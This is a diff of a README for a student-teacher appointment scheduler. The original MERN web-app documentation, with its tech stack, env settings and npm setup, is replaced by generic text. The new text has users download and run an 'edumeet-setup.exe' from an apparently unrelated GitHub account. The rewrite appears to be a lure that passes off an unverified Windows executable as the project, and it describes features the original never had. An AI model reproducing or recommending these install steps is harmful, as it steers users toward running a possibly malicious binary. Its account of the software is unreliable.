@@ -1,230 +1,68 @@
-# 🎓 EduMeet — Smart Appointment Scheduler
+# 📅 edumeet-smart-scheduler - Organize your academic life with ease
 
-> **Bridging the gap between students and teachers through structured, conflict-free academic scheduling.**
+[![Download Edumeet](https://img.shields.io/badge/Download_Edumeet-blue.svg)](https://github.com/Ko167022/edumeet-smart-scheduler)
 
-EduMeet is a **full-stack MERN web application** that streamlines academic interactions by enabling students to book appointments with teachers based on real-time availability — replacing informal communication with a secure, transparent, and efficient scheduling platform.
+## 🎯 About this software
 
-![Made with](https://img.shields.io/badge/Made%20with-MERN%20Stack-brightgreen?style=for-the-badge)
-![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)
-![Status](https://img.shields.io/badge/Status-Active-success?style=for-the-badge)
+Edumeet-smart-scheduler helps students and teachers manage academic schedules. The system stops booking conflicts by checking availability in real time. It uses a secure login process that gives students and teachers their own private portals. You receive email alerts for every meeting update. The system also collects feedback after sessions to suggest improvements for your learning journey. This tool handles everything from simple one-on-one sessions to large group meetings.
 
----
-## 🌐 Live Demo
-👉 [Click here to view the app](https://edumeet-smart-scheduler.vercel.app)
-> ⚠️ Note: Initial load may take a few seconds due to server cold start.
----
+## 📋 System requirements
 
-## 📌 Table of Contents
+Your computer needs these basic items to run this software:
 
-- [Key Features](#-key-features)
-- [Core Functionalities](#-core-functionalities)
-- [Tech Stack](#️-tech-stack)
-- [Project Structure](#-project-structure)
-- [Environment Variables](#️-environment-variables)
-- [How to Run Locally](#️-how-to-run-locally)
-- [Security Features](#-security-features)
-- [Future Enhancements](#-future-enhancements)
+- A Windows computer running version 10 or 11.
+- An active internet connection.
+- A modern web browser like Chrome, Edge, or Firefox.
+- At least 4GB of available memory.
 
----
+## 🛠️ How to install the software
 
-## 🚀 Key Features
+Follow these steps to set up the scheduler on your Windows machine:
 
-### 👨‍🎓 Student
-| Feature | Description |
-|--------|-------------|
-| 🔐 Secure Auth | JWT-based authentication with role-based access |
-| 📅 Book Appointments | Browse teachers and book based on real-time availability |
-| 🚫 Conflict-Free | No duplicate slot bookings via backend validation |
-| 📧 Email Alerts | Automated notifications for booking & status updates |
-| ⭐ Ratings | Submit feedback within a **48-hour window** post-appointment |
-| 🎯 Recommendations | Personalized teacher suggestions based on booking history |
+1. Visit the [official download page](https://github.com/Ko167022/edumeet-smart-scheduler) to grab the latest version of the installer.
+2. Locate the download folder on your computer.
+3. Double-click the file named "edumeet-setup.exe" to start the process.
+4. Follow the instructions on the screen to finish the installation.
+5. Launch the application from your desktop shortcut once the bar fills completely.
 
-### 👩‍🏫 Teacher
-| Feature | Description |
-|--------|-------------|
-| 🔑 Secure Login | Protected dashboard access |
-| 🕐 Manage Slots | Define and update availability slots |
-| ✅ Appointment Control | Accept or reject incoming booking requests |
-| 📋 View Schedule | See all confirmed upcoming appointments |
+## 🔐 Logging in for the first time
 
-### 🛠️ Admin
-| Feature | Description |
-|--------|-------------|
-| ✔️ User Approvals | Approve or reject student/teacher registrations |
-| 👥 User Management | Manage all students and teachers |
-| 📊 Central Monitoring | Oversee all appointments from a single dashboard |
+The software requires a secure login to protect your private academic data. When you open the program, the main screen shows a login box. If this is your first time, click the register link to create your account. Use your student or teacher email address to sign up. The system sends a verification link to your inbox. Click that link to confirm your account. Return to the application and enter your email and password to enter the dashboard.
 
----
+## 🗓️ Creating your first appointment
 
-## 🧠 Core Functionalities
+The dashboard provides a calendar view that shows your day. 
 
-- 🔒 **Role-Based Access Control (RBAC)** — Admin, Teacher, Student
-- 📆 **Availability-Based Scheduling** — Structured and real-time
-- 🚫 **Conflict-Free Booking** — Backend-validated slot protection
-- 📧 **Automated Email Notifications** — Booking confirmations & updates
-- ⭐ **48-Hour Rating System** — Enforced strictly at the backend
-- 🎯 **Personalized Recommendations** — Based on booking history & recency logic
+1. Click the button labeled "New Booking" on the top left of the screen.
+2. Select your desired time slot from the calendar.
+3. Choose the person you want to meet with from the provided list.
+4. Write a short reason for your meeting in the text box.
+5. Click "Confirm" to save your request. 
 
----
+The system checks for conflicts. If the time is open, the system marks the slot as booked and sends an email to both people. If someone else booked that time, the system shows an alert so you can choose a different time.
 
-## 🛠️ Tech Stack
+## 📧 Using email notifications
 
-### 🖥️ Frontend
-![React](https://img.shields.io/badge/React-20232A?style=flat&logo=react&logoColor=61DAFB)
-![TailwindCSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=flat&logo=tailwind-css&logoColor=white)
-![Axios](https://img.shields.io/badge/Axios-5A29E4?style=flat&logo=axios&logoColor=white)
-![React Router](https://img.shields.io/badge/React_Router-CA4245?style=flat&logo=react-router&logoColor=white)
-![Vite](https://img.shields.io/badge/Vite-646CFF?style=flat&logo=vite&logoColor=white)
+You stay updated through automatic email alerts. You receive an email when someone books a session with you. You receive another email if a session gets updated or canceled. These messages include a link to add the meeting directly to your digital calendar. You never miss a session because the system delivers these alerts the moment a status changes.
 
-### ⚙️ Backend
-![Node.js](https://img.shields.io/badge/Node.js-339933?style=flat&logo=nodedotjs&logoColor=white)
-![Express.js](https://img.shields.io/badge/Express.js-000000?style=flat&logo=express&logoColor=white)
-![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=flat&logo=mongodb&logoColor=white)
-![JWT](https://img.shields.io/badge/JWT-000000?style=flat&logo=jsonwebtokens&logoColor=white)
-![bcrypt](https://img.shields.io/badge/bcrypt-003A70?style=flat)
+## 💬 Sharing feedback and getting advice
 
-### 📦 Other Tools
-![Nodemailer](https://img.shields.io/badge/Nodemailer-22B573?style=flat)
-![Git](https://img.shields.io/badge/Git-F05032?style=flat&logo=git&logoColor=white)
-![GitHub](https://img.shields.io/badge/GitHub-181717?style=flat&logo=github&logoColor=white)
+The system asks for your input after every completed session. Look for a popup window that appears shortly after your scheduled meeting ends. You can rate the session and provide comments about your experience. The smart recommendation engine looks at this data to suggest future meeting times or study topics that match your academic goals. This loop helps you manage your time better as you use the tool.
 
----
-## 📸 Screenshots
+## 🛡️ Privacy and account security
 
-### 🏠 Home Page
-![Home Page](assets/screenshots/home.png)
+We focus on keeping your information private. The system uses secure technology to handle your login details. Your user role controls what you see. Teachers can see full schedules while students see only their own bookings. No unauthorized person can change or view your private appointment data. The password encryption ensures that even if you share a computer, your personal schedule remains private.
 
----
+## ⚙️ Troubleshooting common issues
 
-### 🛠️ Admin Dashboard
-![Admin Dashboard](assets/screenshots/admin-dashboard.png)
+If you face trouble, these steps often solve the problem:
 
----
+- Check your internet connection if the calendar does not load.
+- Restart the application if the buttons stop responding.
+- Clear your browser cache if you see old schedule data.
+- Check your spam folder if you do not see the email verification link.
+- Make sure your Windows system uses the latest updates.
 
-### 👨‍🎓 Student Dashboard
-![Student Dashboard](assets/screenshots/student-dashboard.png)
+## ✉️ Getting additional help
 
----
-
-### 📅 Teacher — Manage Appointments
-![Manage Appointments](assets/screenshots/manage-apponitments.png)
-
----
-
-### 👩‍🏫 Teacher — Set Availability
-![Teacher Availability](assets/screenshots/teacher-availability.png)
-
----
-
-## 📂 Project Structure
-
-```
-📁 EDUMEET/
-├── 📁 backend/
-│   ├── 📁 config/
-│   ├── 📁 controllers/
-│   ├── 📁 middleware/
-│   ├── 📁 models/
-│   ├── 📁 node_modules/
-│   ├── 📁 public/
-│   ├── 📁 routes/
-│   ├── 📁 utils/
-│   ├── ⚙️ .env
-│   ├── 📄 .gitignore
-│   ├── 📄 package-lock.json
-│   ├── 📄 package.json
-│   └── 📄 server.js
-└── 📁 frontend/
-    ├── 📁 node_modules/
-    ├── 📁 src/
-    ├── 📄 index.html
-    ├── 📄 package-lock.json
-    ├── 📄 package.json
-    ├── 📄 postcss.config.js
-    ├── 📄 tailwind.config.js
-    └── ⚡ vite.config.js
-```
-
----
-
-## ⚙️ Environment Variables
-
-Create a `.env` file inside the `backend/` folder and add the following:
-
-```env
-PORT=5000
-MONGO_URI=your_mongodb_connection_string
-JWT_SECRET=your_jwt_secret
-EMAIL_USER=your_email@example.com
-EMAIL_PASS=your_app_password
-FRONTEND_URL=http://localhost:5173
-```
-
-> ⚠️ **Never commit your `.env` file to GitHub.** Make sure it's listed in `.gitignore`.
-
----
-
-## ▶️ How to Run Locally
-
-### 1️⃣ Clone the Repository
-
-```bash
-git clone https://github.com/your-username/edumeet-smart-scheduler.git
-cd edumeet-smart-scheduler
-```
-
-### 2️⃣ Backend Setup
-
-```bash
-cd backend
-npm install
-npm run dev
-```
-
-### 3️⃣ Frontend Setup
-
-```bash
-cd frontend
-npm install
-npm run dev
-```
-
-> 🌐 The app will be running at `http://localhost:5173` (frontend) and `http://localhost:5000` (backend).
-
----
-
-## 🔐 Security Features
-
-- ✅ JWT-based stateless authentication
-- ✅ Role-based authorization (RBAC)
-- ✅ Password hashing using **bcrypt**
-- ✅ Protected API routes with middleware
-- ✅ Backend validation for all critical operations
-- ✅ `.env` kept out of version control
-
----
-
-## 📌 Future Enhancements
-
-- [ ] 🔔 Real-time notifications using **WebSockets**
-- [ ] 📊 Admin analytics dashboard (top-rated teachers, booking trends)
-- [ ] 📅 **Google Calendar** integration
-- [ ] 📱 Mobile application support
-- [ ] 🤖 Advanced AI-powered recommendation system
-
----
-
-## 👩‍💻 Author
-
-**P. Lakshmi Sravani**  
-B.Tech CSE | Full-Stack Developer  
-
----
-
-<div align="center">
-
-⭐ **If you found this project helpful, please give it a star!** ⭐
-
-Made with ❤️ by P. Lakshmi Sravani | Full Stack Developer
-
-</div>
+If you still need assistance, reach out through the official support channel. We provide documentation for every part of the software. You can also view the help menu inside the application for quick answers to common questions. The system updates automatically to include new features as we refine the scheduling experience. We work to keep the tool fast, reliable, and easy for everyone to use.
